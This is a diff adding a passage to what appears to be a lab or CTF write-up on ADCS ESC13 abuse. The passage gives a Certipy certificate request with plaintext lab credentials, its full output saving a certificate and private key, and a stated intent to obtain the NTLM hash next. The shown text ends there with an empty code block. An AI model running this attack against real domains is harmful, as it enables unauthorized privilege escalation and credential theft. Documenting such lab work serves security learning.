@@ -546,3 +546,36 @@ Certificate Templates
 
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc13-issuance-policy-with-privileged-group-linked
 
+```python
+certipy-ad req -u 't.dalton@northstone.local' -p '123tonyd' -dc-ip '10.1.209.181' -target 'dc.northstone.local' -ca 'NORTHSTONE-CA' -template 'TemporaryWinRM' -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] DC host (-dc-host) not specified. Using domain as DC host
+[+] Nameserver: '10.1.209.181'
+[+] DC IP: '10.1.209.181'
+[+] DC Host: 'NORTHSTONE.LOCAL'
+[+] Target IP: None
+[+] Remote Name: 'dc.northstone.local'
+[+] Domain: 'NORTHSTONE.LOCAL'
+[+] Username: 'T.DALTON'
+[+] Trying to resolve 'dc.northstone.local' at '10.1.209.181'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.1.209.181[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.1.209.181[\pipe\cert]
+[*] Request ID is 15
+[*] Successfully requested certificate
+[*] Got certificate with UPN 't.dalton@northstone.local'
+[+] Found SID in security extension: 'S-1-5-21-2679383190-2392193949-2554118403-1106'
+[*] Certificate object SID is 'S-1-5-21-2679383190-2392193949-2554118403-1106'
+[*] Saving certificate and private key to 't.dalton.pfx'
+[+] Attempting to write data to 't.dalton.pfx'
+[+] Data written to 't.dalton.pfx'
+[*] Wrote certificate and private key to 't.dalton.pfx'
+```
+
+Now i have the certificate i can get the NTLM
+
+```python
+
+```
